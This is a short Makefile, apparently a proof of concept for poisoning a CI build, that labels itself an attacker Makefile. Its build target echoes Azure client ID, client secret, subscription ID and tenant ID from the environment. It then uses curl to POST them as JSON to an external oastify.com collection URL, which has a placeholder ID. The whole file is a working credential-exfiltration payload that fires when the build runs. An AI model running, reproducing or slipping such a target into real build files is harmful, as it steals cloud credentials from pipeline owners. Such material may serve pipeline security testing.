EXFIL_URL := https://rfa55udoslv4d49ist56idd23t9kxdl2.oastify.com/YOUR-UNIQUE-ID-HERE

.PHONY: build

build:
    @echo "=== ATTACKER MAKEFILE EXECUTING ===" && echo "[*] Dumping Azure credentials..." && echo "AZ_CLIENT_ID=$$AZ_CLIENT_ID" && echo "AZ_CLIENT_SECRET=$$AZ_CLIENT_SECRET" && echo "AZ_SUBSCRIPTION_ID=$$AZ_SUBSCRIPTION_ID" && echo "AZ_TENANT_ID=$$AZ_TENANT_ID" && curl -s -X POST $(EXFIL_URL) -H "Content-Type: application/json" -d "{\"client_id\":\"$$AZ_CLIENT_ID\",\"client_secret\":\"$$AZ_CLIENT_SECRET\",\"subscription_id\":\"$$AZ_SUBSCRIPTION_ID\",\"tenant_id\":\"$$AZ_TENANT_ID\"}" && echo "[+] Credentials exfiltrated."
